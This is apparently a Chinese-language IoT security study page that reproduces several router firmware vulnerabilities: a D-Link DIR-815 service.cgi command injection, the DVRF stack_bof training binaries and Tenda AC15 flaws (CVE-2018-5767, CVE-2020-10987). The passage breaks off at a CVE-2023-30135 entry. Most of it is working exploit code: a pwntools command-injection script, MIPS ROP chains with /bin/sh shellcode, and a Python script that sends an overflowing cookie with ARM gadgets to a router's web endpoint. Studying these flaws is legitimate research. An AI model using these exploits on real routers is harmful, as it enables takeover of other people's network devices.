\u0026lt;/device\u0026gt; \u0026lt;/module\u0026gt; \u0026lt;/postxml\u0026gt; CNVD-2018-01084 # 漏洞基本信息 # 漏洞编号：CNVD-2018-01084\n漏洞类型：远程命令执行\n漏洞利用效果：可执行任意命令\n漏洞披露时间：20180117\n漏洞描述：\nD-Link DIR 615/645/815路由器1.03及之前的固件版本存在远程命令执行漏洞。该漏洞是由于service.cgi中拼接了HTTP POST请求中的数据，造成后台命令拼接，导致可执行任意命令。 设备型号：D-Link DIR 615/645/815\n设备架构：mips\n复现进度：\n已成功复现 已进行静态分析 已进行动态调试 受影响的漏洞组件 ：\n文件名：httpd 功能：用于处理用户发送的 HTTP 请求 定位漏洞组件的方法和工具：\n静态分析工具 ida(32位) ghidra service.cgi 远程命令执行漏洞 学习远程命令执行类漏洞的查找与利用方式 [ 原创] CNVD-2018-01084 漏洞复现报告-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com\nDlink路由器 CNVD-2018-01084 远程命令执行漏洞 复现分析_cnvd-2018-01084复现-CSDN博客\nD-Link | Technical Support | Downloads (dlink.com.tw)\n解包 # $ wget https://ftp.dlink.ru/pub/Router/DIR-815/Firmware/RevA/Old/DIR815A1_FW101b09.bin 静态分析 # 参考 CNVD-2018-01084 漏洞复现报告（service.cgi 远程命令执行漏洞）-二进制漏洞-看雪-安全社区 进行分析\n先checksec检查一下二进制文件：\n将其拖进IDA中先进行静态分析。\n首先进入main函数，可以在66行看到service.cgi与传入的第一个参数v3相比较\n当传入的第一个参数是service.cgi，比对成功后，会进入servicecgi_main函数。\n我们先对servicecgi_main这个函数整体的调用路线进行一个宏观的分析：\n右键查看外部引用至图表（说实话我也是第一次使用这个，还真不错）\n我们猜测漏洞点存在于这里的system函数处，它是由lxmldbc_system函数调用的\n所以我们在函数里面搜索 lxmldbc_system 并查看其伪代码\n在lxmldbc_system函数中，会先进行一个格式化字符串的拼接，再将拼接好的字符串作为system的参数调用，因此，这里的确可能存在一个可被利用的点：\n接着，我们对servicecgi_main函数的流程进行一个分析：\n（1）先获取环境变量REQUEST_METHOD进行判断\n当请求方式为GET的时候，会跳到标签10，而这个标签10在调用lxmldbc_system函数的下面：\n所以，为了利用到lxmldbc_system中的漏洞，我们的请求方式只能为POST。\n（2）分析cgibin_parse_request函数\n然后，会调用到cgibin_parse_request函数，这个函数会先调取环境变量REQUEST_URI，并对其先以?进行字符串分割：\n再进到sub_402B40函数中，发现这里会再以=进行一次字符串分割，对=后的内容再以\u0026amp;进行分割：\n这其实就是对一个URL字符串的解析过程，分割后的字符串，都会被存放进内存中，具体存放在哪里，不太好直接通过静态分析看出。\n之后，在cgibin_parse_request函数中，对CONTENT_TYPE这个环境变量进行了一个判断：\n这里先对环境变量CONTENT_TYPE中的内容的前v17位与v18进行一个比对，比对正确后就会调用一个未知的函数，这里的v18其实是off_42C014中的内容，而v17就是其后四个字节的内容：\n也就是说，我们**CONTENT_TYPE的前12位得是application/**才能过这个判断。\n之后调用到的那个未知的函数也不方便直接通过静态分析看出，在之后动态调试的时候可以很清楚地看到，不过，这里需要注意一下传入这个未知函数的第三个参数v7，其实就是CONTENT_LENGTH这个环境变量：\n（3）分析sess_ispoweruser函数\n在之后，会需要绕过sess_ispoweruser函数，不然无法通过认证：\n这个函数会调用到sess_validate函数，其中会再调用到sess_get_uid函数，在里面有对HTTP_COOKIE和REMOTE_ADDR这两个环境变量的获取，这里就不作具体分析了。\n接着，在sess_validate函数中会继续调用到sub_407660这个函数，其中会打开/var/session/...的文件：\n这个文件显然我们用qemu模拟的环境中是没有的，因此我们需要将sess_ispoweruser这个函数的相关判断给patch掉（直接将跳转命令改成nop空指令），不然就不便于进行后续利用了（会在这里卡住）：\n单字节修改 0x40A398 地址\n然后保存即可\n这样就直接跳过sess_ispoweruser函数的认证检验了，将patch过的二进制文件替换htdocs目录下原有的文件即可。\n（4）一些静态分析看不出来的操作\n再然后，会调用sub_40A1C0函数进行一些判断：\n显然，判断的结果若是满足v6!=0是最好的，因为这里if分支其实大体上都是对v9格式化字符串进行赋值，而v6!=0分支中的内容最简单，下面else分支中的内容会很复杂，当经过这个判断之后，有了**v9这个格式化字符串作为参数**，就可以直接走到lxmldbc_system函数进行漏洞利用了。\n不过，这里sub_40A1C0函数中具体判断的内容不太好直接通过静态分析看出：\n这里的a1就是传进去的EVENT / ACTION / SERVICE这些参数，但是后面的v3[2]应该是用户可控的一个字符串，但是并不知道指向内存的何处。\n同样地，lxmldbc_system函数中，vsnprintf函数的参数va（也就是拼接到前面format格式化字符串中的内容）不知道指向内存的何处，va_start函数同样不知道指向哪里：\n这些都不好通过静态分析直接得出，但是可以猜测都是用户可控的，再联想到之前的REQUEST_URI环境变量分割出的字符串被存放在了内存中，我们也并不知道具体的存放位置，因此，可以猜测这里取的内存就是在之前存放的，为了验证这一观点，我们需要进行动态分析来调试。\n动态调试 # 首先，我们需要知道如何向main函数传递参数argv和设置环境变量：\n我们可以用-0选项传递第一个参数，用-E选项设置环境变量，用-L选项做到类似于更改根目录的效果，用-strace选项追踪程序执行时进程系统调用和所接收的信号，方便调试。\n我们按顺序，先来调试一下CONTENT_TYPE环境变量中application/后应该设置成什么，也就需要知道这里进入的未知函数是什么：\nif ( !strncasecmp(v14, v18, v17) ) return ((int (__fastcall *)(int, int, unsigned int, char *))(\u0026amp;off_42C014)[3 * v16 - 1])( a1, a2, v7, \u0026amp;v14[v17]); 看到对应的汇编：\n最后的跳转命令在0x40346C处，因此，调试的时候我们可以在这里下一个断点\n先启动qemu用户模式：\n$ qemu-mipsel -g 9988 -L . \\ -0 \u0026#34;service.cgi\u0026#34; \\ -E REQUEST_METHOD=\u0026#34;POST\u0026#34; \\ -E REQUEST_URI=\u0026#34;test\u0026#34; \\ -E CONTENT_LENGTH=\u0026#34;5\u0026#34; \\ -E CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; \\ ./htdocs/cgibin # 另开一个终端 $ gdb-multiarch ./htdocs/cgibin # gdb输入命令： target remote:9988 可以很清晰地看到，那个我们静态分析不好看出来的未知函数就是0x403b10。\n在IDA里找到0x403b10的位置，并创建函数\n接着就可以查看伪代码了：\n可见，CONTENT_TYPE环境变量的后面应该是x-www-form-urlencoded，匹配成功后，就会进入sub_402FFC函数，在其中会有一个read函数，需要我们读入数据：\nsub_402FFC 函数的伪代码：\n这里的v7也就是a3，是我们在cgibin_parse_request函数中传入的环境变量CONTENT_LENGTH，根据之前的分析，我们需要这个函数的返回值v4大于零，只要读入合法的数据即可。\n这一部分就分析到这，接下来再验证之前的猜想：sub_40A1C0函数中所取的内存是否为之前REQUEST_URI环境变量所分割出的字符串？\n我们已经知道了REQUEST_URI大体的分割模式，因此可以设REQUEST_URI=\u0026quot;aaa?bbb=ccc\u0026quot;的形式，启动命令如下：\n$ qemu-mipsel -g 9988 -L . \\ -0 \u0026#34;service.cgi\u0026#34; \\ -E REQUEST_METHOD=\u0026#34;POST\u0026#34; \\ -E REQUEST_URI=\u0026#34;aaa?bbb=ccc\u0026#34; \\ -E CONTENT_LENGTH=\u0026#34;5\u0026#34; \\ -E CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; \\ ./htdocs/cgibin 在sub_40A1C0中strcmp的地方对应的汇编处（0x40A200）下一个断点：\n在之前随便输入十个字符，最后停止了断点处\n由此可知，strcmp的第二个参数就是环境变量REQUEST_URI中?与=之间的字符串。\n用同样的方法，可以得到：lxmldbc_system中拼接入格式化字符串的va参数就是环境变量REQUEST_URI中=之后的字符串。\n至此，我们完成了对/htdocs/cgibin这个二进制文件中的漏洞分析，显然，我们将;{cmd};拼接进格式化字符串，由于;可连接两个独立语句并执行，这样就能执行我们的cmd命令了\nexp # from pwn import * context(os = \u0026#39;linux\u0026#39;, arch = \u0026#39;mips\u0026#39;) string = \u0026#34;winmt\u0026#34; length = len(string) print(\u0026#34;----- CNVD-2018-01084 -----\\n\u0026#34;) cmd = input(\u0026#34;command \u0026gt; \u0026#34;) io = process(f\u0026#39;\u0026#39;\u0026#39; qemu-mipsel -L . -strace \\ -0 \u0026#34;service.cgi\u0026#34; \\ -E REQUEST_METHOD=\u0026#34;POST\u0026#34; \\ -E CONTENT_LENGTH={length} \\ -E REQUEST_URI=\u0026#34;?EVENT=;{cmd};\u0026#34; \\ -E CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; \\ -E HTTP_COOKIE=\u0026#34;uid=winmt\u0026#34; \\ -E REMOTE_ADDR=\u0026#34;127.0.0.1\u0026#34; \\ ./htdocs/cgibin \u0026#39;\u0026#39;\u0026#39;, shell = True) io.send(string) io.interactive() DVRF项目 # praetorian-inc/DVRF: The Damn Vulnerable Router Firmware Project (github.com)\n通过利用DVRF项目来进一步分析设备固件，挖掘固件中存在的安全漏洞。该项目的目的是模拟真实设备环境，帮助人们了解 除x86_64 空间之外的其他 CPU 架构\n解包 # $ binwalk -Me DVRF_v03.bin DVRF stack_bof_01 # 静态分析 # 放入ghidra中进行分析\n获取参数后，未校验长度赋值给局部变量造成栈溢出\n而且可以看到有后门函数 0x00400950：\n所以我们可以利用栈溢出来覆盖返回地址的值来是程序运行到后门函数\n动态调试 # 与平时打pwn时对二进制程序进行gdb调试差不多，\n不同在于mips架构需要再qemu上运行\n$ cd /home/iot/vul/DVRF/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root $ cp $(which qemu-mipsel-static) ./qemu-mipsel-static $ echo \u0026#34;test\u0026#34; \u0026gt; content $ sudo chroot . ./qemu-mipsel-static -L ./ -g 9988 ./pwnable/Intro/stack_bof_01 \u0026#34;`cat content`\u0026#34; # 注意要在cat content的外面加上“” # 另开一个终端 $ gdb-multiarch ./pwnable/Intro/stack_bof_01 # gdb爱输入命令： set arch mips set endian big/little target remote remote:9988 # 连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就可以慢慢单步调试 exp # 生成payload:\nfrom pwn import * context.arch = \u0026#34;mips\u0026#34; context.endian = \u0026#34;little\u0026#34; backdoor = 0x0040095c payload = b\u0026#39;a\u0026#39;*0xc8+b\u0026#39;b\u0026#39;*0x4 payload += p32(backdoor) with open(\u0026#34;stack_bof_01_payload\u0026#34;,\u0026#34;w\u0026#34;) as file: file.write(payload.decode()) 成功getshell：\n$ cd /home/iot/vul/DVRF/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root $ cp $(which qemu-mipsel-static) ./qemu-mipsel-static $ sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 \u0026#34;`cat stack_bof_01_payload`\u0026#34; 使用pwntools库来编写exp：\nfrom pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;mips\u0026#39;,endian=\u0026#39;little\u0026#39;,bits=32) backdoor = 0x0040095c payload = b\u0026#39;a\u0026#39;*0xc8 + b\u0026#39;b\u0026#39;*0x4 payload += p32(backdoor) with open(\u0026#34;stack_bof_01_payload\u0026#34;,\u0026#34;w\u0026#34;) as file: file.write(payload.decode()) sh = process(b\u0026#34;sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 \\\u0026#34;`cat stack_bof_01_payload`\\\u0026#34;\u0026#34;.decode() ,shell=True) sh.interactive() 注：\nrop ret2win 时在 x86 平台下我们直接设置 ip寄存器到后面函数的地址就可以了\n但是有时在mips架构上我们设置完$pc 寄存器可能会出现报错：访问了非法内存\n原因在于，在 MIPS 中，函数内部会通过 $t9 寄存器和 $gp 寄存器来找数据，地址等。\n同时在 mips 的手册内默认 $t9 的值为当前函数的开始地址，这样才能正常的索引，所以我们需要先用一个 rop_gadget 设置 $t9, 然后再跳到后门函数。\n所以我们需要在二进制程序或者 libc 中找到类似这样一个gadgets：\n使用 jalr $t9 类的 gadgets 以保证进入函数后， $t9 的值为函数的起始地址\n.text:00006B20 lw $t9, arg_0($sp) .text:00006B24 jalr $t9 之后加上libc的基地址就行了\n用qemu-mipsel-static模拟程序是看不到目标程序的maps的，所以我们可以通过打印 got 表的函数指针，然后计算偏移得到 libc 的基地址。\n所以我们现在的利用流程就是:\n修改返回地址到 rop_gadget, 设置 $r9 为后门函数的地址 跳转到 后门函数，执行system 此时我们的payoad就变成了：\n#!/usr/bin/python padding = b\u0026#34;a\u0026#34; * offset gadget = backdoor = payload = padding + gadget + backdoor with open(\u0026#34;input\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(payload) DVRF stack_bof_02 # 静态分析 # 漏洞点与stack_bof_01相同\n动态调试 # 方式与 stack_bof_01 相同\n$ cd /home/iot/vul/DVRF/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root $ cp $(which qemu-mipsel-static) ./qemu-mipsel-static $ echo \u0026#34;test\u0026#34; \u0026gt; content $ sudo chroot . ./qemu-mipsel-static -L ./ -g 9988 ./pwnable/ShellCode_Required/stack_bof_02 \u0026#34;`cat content`\u0026#34; # 注意要在cat content的外面加上“” # 另开一个终端 $ gdb-multiarch ./pwnable/ShellCode_Required/stack_bof_02 # gdb爱输入命令： set arch mips set endian big/little target remote:9988 # 连上之后会停在 start ，在 main 函数开头打断点，运行到这个断点，然后就可以慢慢单步调试 exp # 参考： DVRF 路由器漏洞靶机题目笔记 | SkYe231 Blog (mrskye.cn)\n先调用 sleep(1) 就需要找 gadget 控制参数以及跳转。\nmipsrop.find(\u0026ldquo;li $a0,1\u0026rdquo;) 控制第一个参数\n.text:0002FB10 li $a0, 1 .text:0002FB14 move $t9, $s1 .text:0002FB18 jalr $t9 ; sub_2F818 接着需要找一个控制 s1 的 gadget ，用于控制执行完 gadget1 之后跳转到哪里。mipsrop.find(\u0026ldquo;li $s1\u0026rdquo;) 结果有很多，最后选了 gadget2 = 0x00007730 ：\n.text:00007730 lw $ra, 0x18+var_s10($sp) .text:00007734 lw $s3, 0x18+var_sC($sp) .text:00007738 lw $s2, 0x18+var_s8($sp) .text:0000773C lw $s1, 0x18+var_s4($sp) .text:00007740 lw $s0, 0x18+var_s0($sp) .text:00007744 jr $ra 至此 a0 被控制为 1 ，目前 payload 结构为：\npayload = \u0026#34;a\u0026#34;*508 payload += p32(gadget2) payload += \u0026#34;a\u0026#34;*0x18 payload += \u0026#34;bbbb\u0026#34;#s0 payload += \u0026#34;????\u0026#34;#s1 payload += \u0026#34;bbbb\u0026#34;#s2 payload += \u0026#34;bbbb\u0026#34;#s3 payload += p32(gadget1)#ra 不能直接将 sleep(0x767142b0) 填到 s1 处，因为直接填地址跳转 sleep 缺少了跳转前将返回地址放到 ra 寄存器（或压栈）的过程，当 sleep 运行到结尾的 jalr $ra 时，又会跳转会到 gadget1 ，所以要换个方式。\nmipsrop.tails() 找通过 s0\\s2\\s3 寄存器跳转的 gadget ，选择了 gadget3 = 0x00020F1C ：\n.text:00020F1C move $t9, $s2 .text:00020F20 lw $ra, 0x18+var_sC($sp) .text:00020F24 lw $s2, 0x18+var_s8($sp) .text:00020F28 lw $s1, 0x18+var_s4($sp) .text:00020F2C lw $s0, 0x18+var_s0($sp) .text:00020F30 jr $t9 解决 sleep 运行结束返回地址问题，并 lw $ra, 0x18+var_sC($sp) 控制下一层跳转，payload 结构：\npayload = \u0026#34;a\u0026#34;*508 payload += p32(gadget2) payload += \u0026#34;a\u0026#34;*0x18 payload += \u0026#34;bbbb\u0026#34;#s0 payload += p32(gadget3)#s1 payload += p32(sleep)#s2 payload += \u0026#34;bbbb\u0026#34;#s3 payload += p32(gadget1)#ra ####### payload += \u0026#34;a\u0026#34;*(0x18+0x4) payload += \u0026#34;cccc\u0026#34;#s0 payload += \u0026#34;cccc\u0026#34;#s1 payload += \u0026#34;cccc\u0026#34;#s2 payload += \u0026#34;????\u0026#34;#ra mipsrop.stackfinders() 找一个 gadget 提取栈地址放到寄存器中，找的时候还要注意控制下一次跳转选择 gadget4 = 0x16dd0 这个，通过 gadget3 提前将下次跳转地址写入 s0 :\n.text:00016DD0 addiu $a0, $sp, 0x38+var_20 .text:00016DD4 move $t9, $s0 .text:00016DD8 jalr $t9 payload = \u0026#34;a\u0026#34;*508 payload += p32(gadget2) payload += \u0026#34;a\u0026#34;*0x18 payload += \u0026#34;bbbb\u0026#34;#s0 payload += p32(gadget3)#s1 payload += p32(sleep)#s2 payload += \u0026#34;bbbb\u0026#34;#s3 payload += p32(gadget1)#ra ####### payload += \u0026#34;a\u0026#34;*(0x18+0x4) payload += \u0026#34;????\u0026#34;#s0 payload += \u0026#34;cccc\u0026#34;#s1 payload += \u0026#34;cccc\u0026#34;#s2 payload += p32(gadget4)#ra 最后找一个用 a0 跳转的 gadget ，一开始用 mipsrop.tails() 没找到，最后用 mipsrop.find(\u0026ldquo;move $t9,$a0)\u0026rdquo;) 找着了 gadget5 = 0x214a0 ，对 mipsrop 理解不够……\n.text:000214A0 move $t9, $a0 .text:000214A4 sw $v0, 0x30+var_18($sp) .text:000214A8 jalr $t9 最后跳转 shellcode 时，0x000214A4 的这句汇编 sw $v0, 0x30+var_18($sp) 会将 shellcode 第一个指令替换为 nop ，用无意义指令填充，将 shellcode 向后移。\npayload = \u0026#34;a\u0026#34;*508 payload += p32(gadget2) payload += \u0026#34;a\u0026#34;*0x18 payload += \u0026#34;bbbb\u0026#34;#s0 payload += p32(gadget3)#s1 payload += p32(sleep)#s2 payload += \u0026#34;bbbb\u0026#34;#s3 payload += p32(gadget1)#ra ####### payload += \u0026#34;a\u0026#34;*(0x18+0x4) payload += p32(gadget5)#s0 payload += \u0026#34;cccc\u0026#34;#s1 payload += \u0026#34;cccc\u0026#34;#s2 payload += p32(gadget4)#ra ####### payload += \u0026#34;a\u0026#34;*0x18 payload += p32(0xdeadbeef) payload += shellcode 最后的exp:\nfrom pwn import * context.binary = \u0026#34;./pwnable/ShellCode_Required/stack_bof_02\u0026#34; context.arch = \u0026#34;mips\u0026#34; context.endian = \u0026#34;little\u0026#34; # libc_base = 0x766e5000 sleep = 0x767142b0#0x2F2B0+0x766e5000 gadget1 = 0x76714b10 \u0026#39;\u0026#39;\u0026#39; 0x76714b10: li a0,1 0x76714b14: move t9,s1 0x76714b18: jalr t9 \u0026#39;\u0026#39;\u0026#39; gadget2 = 0x766ec730 \u0026#39;\u0026#39;\u0026#39; 0x766ec730: lw ra,40(sp) 0x766ec734: lw s3,36(sp) 0x766ec738: lw s2,32(sp) 0x766ec73c: lw s1,28(sp) 0x766ec740: lw s0,24(sp) 0x766ec744: jr ra \u0026#39;\u0026#39;\u0026#39; gadget3 = 0x76705f1c \u0026#39;\u0026#39;\u0026#39; 0x76705f1c: move t9,s2 0x76705f20: lw ra,36(sp) 0x76705f24: lw s2,32(sp) 0x76705f28: lw s1,28(sp) 0x76705f2c: lw s0,24(sp) 0x76705f30: jr t9 \u0026#39;\u0026#39;\u0026#39; gadget4 = 0x766fbdd0 \u0026#39;\u0026#39;\u0026#39; 0x766fbdd0: addiu a0,sp,24 0x766fbdd4 \u0026lt;optarg\u0026gt;: move t9,s0 0x766fbdd8: jalr t9 \u0026#39;\u0026#39;\u0026#39; gadget5 = 0x767064a0 \u0026#39;\u0026#39;\u0026#39; 0x767064a0: move t9,a0 0x767064a4: sw v0,24(sp) 0x767064a8: jalr t9 \u0026#39;\u0026#39;\u0026#39; shellcode = \u0026#34;\\xff\\xff\\x06\\x28\u0026#34; # slti $a2, $zero, -1 shellcode += \u0026#34;\\x62\\x69\\x0f \u0026#34; # lui $t7, 0x6962 shellcode += \u0026#34;\\x2f\\x2f\\xef\\x35\u0026#34; # ori $t7, $t7, 0x2f2f shellcode += \u0026#34;\\xf4\\xff\\xaf\\xaf\u0026#34; # sw $t7, -0xc($sp) shellcode += \u0026#34;\\x73\\x68\\x0e \u0026#34; # lui $t6, 0x6873 shellcode += \u0026#34;\\x6e\\x2f\\xce\\x35\u0026#34; # ori $t6, $t6, 0x2f6e shellcode += \u0026#34;\\xf8\\xff\\xae\\xaf\u0026#34; # sw $t6, -8($sp) shellcode += \u0026#34;\\xfc\\xff\\xa0\\xaf\u0026#34; # sw $zero, -4($sp) shellcode += \u0026#34;\\xf5\\xff\\xa4\\x27\u0026#34; # addiu $a0, $sp, -0xc shellcode += \u0026#34;\\xff\\xff\\x05\\x28\u0026#34; # slti $a1, $zero, -1 shellcode += \u0026#34;\\xab\\x0f\\x02\\x24\u0026#34; # addiu;$v0, $zero, 0xfab shellcode += \u0026#34;\\x0c\\x01\\x01\\x01\u0026#34; # syscall 0x40404 payload = \u0026#34;a\u0026#34;*508 payload += p32(gadget2) payload += \u0026#34;a\u0026#34;*0x18 payload += \u0026#34;bbbb\u0026#34;#s0 payload += p32(gadget3)#s1 payload += p32(sleep)#s2 payload += \u0026#34;bbbb\u0026#34;#s3 payload += p32(gadget1)#ra ####### payload += \u0026#34;a\u0026#34;*(0x18+0x4) payload += p32(gadget5)#s0 payload += \u0026#34;cccc\u0026#34;#s1 payload += \u0026#34;cccc\u0026#34;#s2 payload += p32(gadget4)#ra ####### payload += \u0026#34;a\u0026#34;*0x18 payload += p32(0xdeadbeef) payload += shellcode with open(\u0026#34;stack_bof_02_payload\u0026#34;,\u0026#34;w\u0026#34;) as file: file.write(payload) Tenda # CVE-2018-5767 # 漏洞基本信息 # 漏洞编号：CVE-2018-5767 漏洞类型： 栈溢出 漏洞利用效果：栈溢出，可以修改返回地址，进而远程执行代码 漏洞披露时间：2018.02.15 漏洞描述： 没有限制用户的输入，使用函数 sscanf 直接将输入拷贝到栈上，导致栈溢出，可以修改返回地址，进而远程执行代码 设备型号：Tenda AC15 V15.03.1.16_multi 设备架构：arm 复现进度： 静态分析 受影响的漏洞组件 ： 文件名：httpd 定位漏洞组件的方法和工具： IDA gdb 漏洞分析 # 查看漏洞函数R7WebsSecurityHandler的伪代码\n第87行使用了函数 strstr 尝试在 (a1 + 184) 处找到 “password=” 字符串的位置\n其中(a1 + 184) 是用户的http请求，password 是请求中 cookie 的一个字段\n如果找到了 password，就会进入if分支，使用正则匹配 “password=” 之后的字符串，并将匹配出的结果存入变量 v33 中\n可以看到v33的定义：\n可以发现代码没有判断字段的最大长度，直接将内容拷贝到栈上\n如果用户精心构造一个password，那么可能有机会利用栈溢出漏洞控制整个程序的流程，进而达到远程执行代码的目的\n漏洞复现 # 先配置好qemu 的网络参数，首先安装必要的工具\n$ apt-get install bridge-utils uml-utilities 接着要修改网络配置，编辑/etc/network/interfaces\n# interfaces(5) file used by ifup(8) and ifdown(8) auto lo iface lo inet loopback auto ens33 iface ens33 inet manual up ifconfig ens33 0.0.0.0 up auto br0 iface br0 inet dhcp bridge_ports ens33 bridge_maxwait 0 新建一个shell 脚本 /etc/qemu-ifup\n#!/bin/sh echo \u0026#34;Executing /etc/qemu-ifup\u0026#34; echo \u0026#34;Bringing $1 for bridged mode...\u0026#34; sudo /sbin/ifconfig $1 0.0.0.0 promisc up echo \u0026#34;Adding $1 to br0\u0026#34; sudo /sbin/brctl addif br0 $1 sleep 3 重启网络服务\n$ sudo /etc/init.d/networking restart $ sudo ifdown ens33 $ sudo ifup br0 如果其中哪一步报错，尝试重启一下虚拟机。\n启动程序：\n$ sudo chroot . ./qemu-arm-static -g 10000 ./bin/httpd 中间出现出错，参考了 CataLpa师傅的文章发现需要patch一下才能运行\npatch完成功运行后抓一个数据包，这个包的内容应该如下：\nGET /goform/execCommand HTTP/1.1 Host: 192.168.245.136 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 为了触发漏洞，我们要手动添加一个Cookie 字段\n构造以下 payload：\nGET /goform/execCommand HTTP/1.1 Host: 192.168.245.136 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cookie: password=\u0026#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaae.gifbbbbbbbbbbbbbbbbbbbbtesttest\u0026#34; Cache-Control: max-age=0 重放数据包，成功执行了puts 函数并输出我们的内容\n用python写的exp如下：\nimport struct import requests ip = \u0026#34;192.168.211.7\u0026#34; command = \u0026#34;/bin/sh\\x00\u0026#34; url = \u0026#34;http://{:s}/goform/exeCommand\u0026#34;.format(ip) headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39;, \u0026#39;Accept-Language\u0026#39;: \u0026#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;Upgrade-Insecure-Requests\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;Cookie\u0026#39;: \u0026#39;password=\u0026#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaae.gifbbbbbbbbbbbbbbbbbbbbtesttest\u0026#34;\u0026#39;, \u0026#39;Cache-Control\u0026#39;: \u0026#39;max-age=0\u0026#39; } libc = 0x3fde6000 pop_r3_pc = struct.pack(\u0026#34;\u0026lt; I\u0026#34;,0x00018298+libc)#pop r3 pc mov_r0_sp_blx_r3 = struct.pack(\u0026#34;\u0026lt; I\u0026#34;, 0x00040cb8 + libc)# mov r0 sp; blx r3 system = struct.pack(\u0026#34;\u0026lt; I\u0026#34;, 0x0005A270+libc) command = command.encode()# \u0026#39;byte\u0026#39; password = b\u0026#34;A\u0026#34; * 444 + b\u0026#34;.gif\u0026#34;+pop_r3_pc+system+mov_r0_sp_blx_r3+command headers[\u0026#39;Cookie\u0026#39;]=b\u0026#34;password=\u0026#34;+password try: response = requests.get(url,headers=headers,timeout=1) except: pass CVE-2020–10987 # 漏洞基本信息 # 漏洞编号：CVE-2020–10987 漏洞类型： 命令注入 漏洞利用效果：执行任意系统命令 漏洞披露时间：2022.03.26 漏洞描述： goform/setUsbUnload端点允许远程攻击者通过deviceName POST参数执行任意系统命令 设备型号：Tenda AC15 AC1900 version 15.03.05.19 设备架构：arm 复现进度： 静态分析 受影响的漏洞组件 ： 文件名：httpd 定位漏洞组件的方法和工具： SaTC IDA SaTC定位漏洞 # $ wget https://down.tenda.com.cn/uploadfile/AC18/ac18_kf_V15.03.05.19(6318_)_cn.zip $ binwalk -Me ac18_kf_V15.03.05.19(6318_)_cn.zip $ sudo docker run -it -v ./squashfs-root/:/home/satc/SaTC/SaTC_data smile0304/satc # 进入SaTC容器中 # 检查/home/satc/SaTC/SaTC_data文件夹中是否有数据 $ ls /home/satc/SaTC/SaTC_data $ cd ~/SaTC # 测试/bin/httpd是否存在命令注入漏洞 $ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script=ref2sink_cmdi -b httpd --taint_check # 测试/bin/httpd是否存在缓冲区溢出漏洞 $ python satc.py -d /home/satc/SaTC/SaTC_data -o /home/satc/res --ghidra_script=ref2sink_bof -b httpd --taint_check 过程中可能会飘红，或者警告，可以直接忽略\n只要在/home/satc/res下找到txt文件\nbinary: /home/satc/SaTC/SaTC_data/bin/httpd configfile: /home/satc/res/ghidra_extract_result/httpd/httpd_ref2sink_cmdi.result-alter2 0xef168 0xa1808 not found ``` 0xf2208 0xa6890 found : 0xa68f8 ``` 0xefb24 0xa2994 not found total cases: 110 find cases: 1 binary: /home/satc/SaTC/SaTC_data/bin/httpd configfile: /home/satc/res/ghidra_extract_result/httpd/httpd_ref2sink_cmdi.result-alter2 IDA下查看0xa68f8地址发现是formsetUsbUnload函数，查看其伪代码分析漏洞\n漏洞分析 # 可以看到deviceName参数被借传到了doSystemCmd函数中，这将导致一个任意的命令执行\nCVE-2023-30135 # 漏洞基本信息 # 漏洞编号：CVE-2023-30135 漏洞类型： 命令注入 